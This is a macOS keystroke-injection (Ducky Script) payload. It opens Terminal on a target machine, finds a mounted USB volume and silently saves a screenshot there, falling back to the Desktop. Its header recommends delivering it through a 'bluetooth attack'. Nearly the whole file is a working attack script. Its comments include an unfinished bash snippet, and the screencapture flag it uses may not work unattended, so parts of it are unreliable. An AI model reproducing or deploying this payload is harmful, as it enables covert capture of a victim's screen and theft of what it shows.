REM Title: MacOS screenshot to usb
REM Author: Wu1g
REM Description: Takes screen shot and then saves to usb stick
REM Target: MacOS 
REM Version: 1.0
REM Category: MacOS - Wu1g scripts
REM Must use bash or linux, requires usb stick however fall back save to desktop, best applied through bluetooth attack with separate usb stick in Mac 
REM Draft code

REM If your main disk is not called `Macintosh HD`, adjust the `grep -v "^/Volumes/Macintosh"` part to match its name (or remove that filter if you’re sure any `/Volumes/*` entry is a USB).

REM If you’d rather it **fail** when no USB is detected instead of falling back to Desktop, replace the fallback block with something like:

REM ```bash
REM if [ -z "$USB_PATH" ]; then
REM echo "No USB drive detected. Aborting."
REM exit 1
REM  else
REM  SAVE_DIR="$USB_PATH"



DELAY 2000
GUI SPACE
DELAY 500
STRING terminal
DELAY 500
ENTER
DELAY 500
STRING echo "USB Script Utility"
ENTER
DELAY 500
STRING echo "-------------------"
ENTER
DELAY 500
STRING echo "Detecting USB drive..."
ENTER
DELAY 500

STRING USB_PATH=$(ls -d /Volumes/* 2>/dev/null | grep -v "^/Volumes/Macintosh" | head -n 1)
ENTER
DELAY 300

STRING if [ -z "$USB_PATH" ]; then
ENTER
DELAY 200
STRING     echo "No USB drive detected. Using Desktop as fallback."
ENTER
DELAY 300
STRING     SAVE_DIR=~/Desktop
ENTER
DELAY 200
STRING else
ENTER
DELAY 200
STRING     echo "Using USB drive: $USB_PATH"
ENTER
DELAY 300
STRING     SAVE_DIR="$USB_PATH"
ENTER
DELAY 200
STRING fi
ENTER
DELAY 300

STRING echo "Capturing Screenshot..."
ENTER
DELAY 500
STRING screencapture -W "$SAVE_DIR/screenshot.png"
ENTER
DELAY 1000
STRING echo "Screenshot captured and saved to: $SAVE_DIR/screenshot.png"
ENTER
DELAY 500
STRING echo "-------------------"
ENTER
DELAY 2000
GUI q
DELAY 1000
ENTER